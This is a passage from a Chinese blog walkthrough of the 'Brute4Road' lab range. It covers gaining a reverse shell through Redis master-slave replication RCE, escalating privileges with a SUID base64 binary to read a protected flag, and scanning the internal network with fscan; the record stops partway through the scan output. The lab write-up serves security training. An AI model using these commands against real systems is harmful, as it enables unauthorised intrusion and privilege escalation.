@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Brute4Roadredis主从复制拿shellfscan扫描，6379端口开放，尝试redis漏洞，发现主从复制rce（https:&#x2F;&#x2F;github.com&#x2F;n0b0dyCN&#x2F;redis-rogue-server）可以利用，主从复制原理：主机负责写，从机负责读，实现读写分流  redis系列漏洞参考文章：https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;249238.h">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云境-Brute4Road">
+<meta property="og:url" content="https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/index.html">
+<meta property="og:site_name" content="Ca1m">
+<meta property="og:description" content="Brute4Roadredis主从复制拿shellfscan扫描，6379端口开放，尝试redis漏洞，发现主从复制rce（https:&#x2F;&#x2F;github.com&#x2F;n0b0dyCN&#x2F;redis-rogue-server）可以利用，主从复制原理：主机负责写，从机负责读，实现读写分流  redis系列漏洞参考文章：https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;249238.h">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741092716321-d3b5d67e-40b7-4485-9095-14d84c151540.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741092812558-c7fef9cf-dfa3-4240-9971-cb00215aa194.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741092950977-9c8831e5-934c-4a17-b8c8-40f85177599d.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093101229-62ade2b8-9102-43d1-afde-6f624f99f470.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093217907-54cbd57a-3ccd-44c3-b335-c5fa16b20091.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093272153-a0fb0d59-8f71-4273-bb6c-afaa8670791a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093368204-26e10a63-1b43-4372-a04d-8a64a6b3e80a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093443543-c7b82852-e534-420c-91fc-9fb46463067d.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741094138850-39681a91-0a6a-4653-9f3e-19b8f4172f5a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741094097680-ed140052-dfad-4a82-b3c8-67acd012e3ca.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741096508666-f46f4c5b-86bd-424a-bc0b-cd9899fff26f.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741096634000-4fd163b4-8589-414f-8d61-65e3c2cb8e77.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097242152-432e24ac-96c4-427c-91ac-19c1404bed23.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097468462-65f4738c-3b1f-4fea-9197-0bb62f215ffd.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097535093-d8020696-cb8e-4efb-925e-7ac856d333e1.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097611345-626c0295-5559-4f33-a7a4-7ea3a73c8fae.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097825364-0c40cb50-178a-4601-b5c9-957d0ffd7379.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097848512-32f63a9b-b19f-4fa1-a61e-e642a10b52ff.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097893511-d550b24f-bebb-405f-8861-ca75914eb4cb.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097949837-bd1dc40d-912a-49a6-beb0-1c8dbec6fb9a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741098031228-51623acd-b968-4fdb-8a75-c28e064032b1.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741099289493-89c305d8-7d31-407a-9897-46ccdaba099c.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741099687174-ae3aa826-ea72-41f6-b05e-3f0117b68a75.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741099672431-f77c0d4c-4dcc-4fe0-bb9a-bc1b7e8c8cb9.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741173053940-52a8cf16-e934-49b0-9071-498948ab5472.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741173674191-1d0d56f3-d525-42b3-b4dd-993d7bea54bf.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741173741629-bc01e5f5-32a8-4973-810c-8d982b9d2bc3.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741173940219-360b1c9b-55da-48b7-b6ee-790d66abcb6b.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741174493844-66ff867c-1d95-4e26-8e0b-d25c5328698b.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741175206994-aca6b607-39e0-49f8-a5dd-8bfaae57ae49.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741176177798-4ad88854-8e4f-43eb-b2f3-89b27c855ed1.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741176338122-b4118e59-c198-46e9-8e3b-0f562523f580.png">
+<meta property="article:published_time" content="2025-01-03T14:51:29.000Z">
+<meta property="article:modified_time" content="2025-03-06T08:08:57.662Z">
+<meta property="article:author" content="Ca1m">
+<meta property="article:tag" content="域">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741092716321-d3b5d67e-40b7-4485-9095-14d84c151540.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>春秋云境-Brute4Road</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&text=春秋云境-Brute4Road"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&title=春秋云境-Brute4Road"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&is_video=false&description=春秋云境-Brute4Road"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云境-Brute4Road&body=Check out this article: https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&title=春秋云境-Brute4Road"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&title=春秋云境-Brute4Road"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&title=春秋云境-Brute4Road"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&title=春秋云境-Brute4Road"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&name=春秋云境-Brute4Road&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&t=春秋云境-Brute4Road"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Brute4Road"><span class="toc-number">1.</span> <span class="toc-text">Brute4Road</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%8B%BFshell"><span class="toc-number">1.1.</span> <span class="toc-text">redis主从复制拿shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">1.3.</span> <span class="toc-text">爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">1.4.</span> <span class="toc-text">域渗透</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        春秋云境-Brute4Road
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ca1m</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-03T14:51:29.000Z" class="dt-published" itemprop="datePublished">2025-01-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/">内网攻防</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%9F%9F/" rel="tag">域</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Brute4Road"><a href="#Brute4Road" class="headerlink" title="Brute4Road"></a>Brute4Road</h1><h2 id="redis主从复制拿shell"><a href="#redis主从复制拿shell" class="headerlink" title="redis主从复制拿shell"></a>redis主从复制拿shell</h2><p>fscan扫描，6379端口开放，尝试redis漏洞，发现主从复制rce（<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server%EF%BC%89%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%EF%BC%8C%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8E%9F%E7%90%86%EF%BC%9A%E4%B8%BB%E6%9C%BA%E8%B4%9F%E8%B4%A3%E5%86%99%EF%BC%8C%E4%BB%8E%E6%9C%BA%E8%B4%9F%E8%B4%A3%E8%AF%BB%EF%BC%8C%E5%AE%9E%E7%8E%B0%E8%AF%BB%E5%86%99%E5%88%86%E6%B5%81">https://github.com/n0b0dyCN/redis-rogue-server）可以利用，主从复制原理：主机负责写，从机负责读，实现读写分流</a></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741092716321-d3b5d67e-40b7-4485-9095-14d84c151540.png"></p>
+<p>redis系列漏洞参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/249238.html">https://www.freebuf.com/articles/web/249238.html</a><br>在vps上执行：</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741092812558-c7fef9cf-dfa3-4240-9971-cb00215aa194.png"></p>
+<p>输入r，反向shell</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741092950977-9c8831e5-934c-4a17-b8c8-40f85177599d.png"></p>
+<p>此时vps再监听其他端口接受反弹的shell,弹出来shell之后创建一个伪终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093101229-62ade2b8-9102-43d1-afde-6f624f99f470.png"></p>
+<p>&#x2F;home&#x2F;redis看到flag</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093217907-54cbd57a-3ccd-44c3-b335-c5fa16b20091.png"></p>
+<p>cat flag发现权限不够</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093272153-a0fb0d59-8f71-4273-bb6c-afaa8670791a.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>suid提权探针</p>
+<p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093368204-26e10a63-1b43-4372-a04d-8a64a6b3e80a.png"></p>
+<p>这里用base64</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 &quot;/home/redis/flag/flag01&quot; | base64 --decode</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093443543-c7b82852-e534-420c-91fc-9fb46463067d.png"></p>
+<p>看到内网网段</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741094138850-39681a91-0a6a-4653-9f3e-19b8f4172f5a.png"></p>
+<p>wget 下载fscan，扫描</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741094097680-ed140052-dfad-4a82-b3c8-67acd012e3ca.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.2.0/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-03-04 21:17:06] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-03-04 21:17:06] [INFO] 开始信息扫描</span><br><span class="line">[2025-03-04 21:17:06] [INFO] CIDR范围: 172.22.2.0-172.22.2.255</span><br><span class="line">[2025-03-04 21:17:06] [INFO] 生成IP范围: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-03-04 21:17:06] [INFO] 解析CIDR 172.22.2.0/24 -&gt; IP范围 172.22.2.0-172.22.2.255</span><br><span class="line">[2025-03-04 21:17:06] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-03-04 21:17:06] [INFO] 开始主机扫描</span><br><span class="line">[2025-03-04 21:17:06] [INFO] 正在尝试无监听ICMP探测...</span><br><span class="line">[2025-03-04 21:17:06] [INFO] 当前用户权限不足,无法发送ICMP包</span><br><span class="line">[2025-03-04 21:17:06] [INFO] 切换为PING方式探测...</span><br><span class="line">[2025-03-04 21:17:06] [SUCCESS] 目标 172.22.2.3      存活 (ICMP)</span><br><span class="line">[2025-03-04 21:17:06] [SUCCESS] 目标 172.22.2.7      存活 (ICMP)</span><br><span class="line">[2025-03-04 21:17:06] [SUCCESS] 目标 172.22.2.16     存活 (ICMP)</span><br><span class="line">[2025-03-04 21:17:07] [SUCCESS] 目标 172.22.2.18     存活 (ICMP)</span><br><span class="line">[2025-03-04 21:17:07] [SUCCESS] 目标 172.22.2.34     存活 (ICMP)</span><br><span class="line">[2025-03-04 21:17:12] [INFO] 存活主机数量: 5</span><br><span class="line">[2025-03-04 21:17:12] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.18:80</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.16:80</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.18:22</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.7:80</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.7:22</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.7:21</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.3:135</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.34:135</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.3:139</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.16:135</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.18:445</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.34:139</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.34:445</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.16:445</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.18:139</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.3:389</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.3:445</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.16:139</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.3:88</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.16:1433</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.7:6379</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 服务识别 172.22.2.18:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 服务识别 172.22.2.7:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 服务识别 172.22.2.7:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.16:80 =&gt; [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.7:80 =&gt; [http] 版本:1.20.1 产品:nginx</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.3:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.34:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.34:445 =&gt; </span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.16:445 =&gt; </span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.3:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.3:445 =&gt; </span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.16:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-03-04 21:17:19] [SUCCESS] 服务识别 172.22.2.3:88 =&gt; </span><br><span class="line">[2025-03-04 21:17:19] [SUCCESS] 服务识别 172.22.2.16:1433 =&gt; [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.]</span><br><span class="line">[2025-03-04 21:17:20] [SUCCESS] 服务识别 172.22.2.18:80 =&gt; [http]</span><br><span class="line">[2025-03-04 21:18:13] [SUCCESS] 服务识别 172.22.2.18:445 =&gt; </span><br><span class="line">[2025-03-04 21:18:13] [SUCCESS] 服务识别 